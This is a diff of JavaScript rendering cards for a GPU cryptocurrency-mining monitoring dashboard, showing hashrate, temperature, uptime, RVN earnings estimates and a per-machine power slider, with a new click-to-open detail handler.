+    const gpuColor=m.gpu_usage_percent>70?'#f85149':m.gpu_usage_percent>40?'#d29922':'#3fb950';
+    const upH=Math.floor((m.uptime_minutes||0)/60);
+    const upM=(m.uptime_minutes||0)%60;
+    const e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);
+    const curPower=m.target_power||100;
+    const h=esc(m.hostname);
+    const delay=(i*0.08).toFixed(2);
 
-    return '<div class="card"><div class="card-header"><span class="card-name">'+h+'</span><span class="badge '+status+'">'+statusLabel+'</span></div>'
-      +'<div class="card-row"><span class="k">GPU</span><span class="v">'+esc(m.gpu_name||"—")+'</span></div>'
-      +'<div class="card-row"><span class="k">Hashrate</span><span class="v">'+(m.hashrate_mhs||0).toFixed(2)+' MH/s</span></div>'
-      +'<div class="card-row"><span class="k">Utilisation GPU</span><span class="v" style="color:'+gpuColor+'">'+m.gpu_usage_percent+'%</span></div>'
-      +'<div class="gpu-bar"><div class="fill" style="width:'+m.gpu_usage_percent+'%;background:'+gpuColor+'"></div></div>'
-      +'<div class="card-row"><span class="k">Temperature</span><span class="v">'+m.gpu_temp_c+'&deg;C</span></div>'
-      +'<div class="card-row"><span class="k">IP</span><span class="v">'+esc(m.ip_address||"—")+'</span></div>'
+    return '<div class="card" style="animation-delay:'+delay+'s" onclick="openMachineDetail(\''+h+'\')">'
+      +'<div class="card-header"><span class="card-name">'+h+'</span><span class="badge '+status+'">'+statusLabel+'</span></div>'
+      +'<div class="card-row"><span class="k">GPU</span><span class="v">'+esc(m.gpu_name||'--')+'</span></div>'
+      +'<div class="card-row"><span class="k">Hashrate</span><span class="v" style="color:#3fb950">'+(m.hashrate_mhs||0).toFixed(2)+' MH/s</span></div>'
+      +'<div class="card-row"><span class="k">GPU</span><span class="v" style="color:'+gpuColor+'">'+m.gpu_usage_percent+'%</span></div>'
+      +'<div class="gpu-bar"><div class="fill" style="--bar-w:'+m.gpu_usage_percent+'%;width:'+m.gpu_usage_percent+'%;background:'+gpuColor+'"></div></div>'
+      +'<div class="card-row"><span class="k">Temp</span><span class="v">'+m.gpu_temp_c+'&deg;C</span></div>'
       +'<div class="card-row"><span class="k">Uptime</span><span class="v">'+upH+'h '+upM+'m</span></div>'
       +'<div class="card-earnings">'
         +'<div class="ce-block"><div class="ce-val">'+e.dailyRvn.toFixed(1)+'</div><div class="ce-label">RVN/jour</div></div>'
         +'<div class="ce-block"><div class="ce-val">$'+(e.dailyRvn*rvnPriceUsd).toFixed(2)+'</div><div class="ce-label">$/jour</div></div>'
-        +'<div class="ce-block"><div class="ce-val">'+e.totalRvn.toFixed(0)+'</div><div class="ce-label">RVN total</div></div>'
-        +'<div class="ce-block"><div class="ce-val">$'+(e.totalRvn*rvnPriceUsd).toFixed(2)+'</div><div class="ce-label">$ total</div></div>'
       +'</div>'
-      +'<div class="card-controls">'
+      +'<div class="card-controls" onclick="event.stopPropagation()">'
         +'<div class="power-row">'
           +'<label>Puissance</label>'
-          +'<input type="range" min="10" max="100" step="5" value="'+curPower+'" onchange="setPower(\''+h+'\',this.value)" oninput="document.getElementById(\'pw-'+h+'\').textContent=this.value+\'%\'">'
+          +'<input type="range" min="10" max="100" step="5" value="'+curPower+'" onchange="setPower(\''+h+'\',this.value,false)" oninput="document.getElementById(\'pw-'+h+'\').textContent=this.value+\'%\'">'
           +'<span class="power-val" id="pw-'+h+'">'+curPower+'%</span>'
         +'</div>'
         +'<div class="ctrl-btns">'
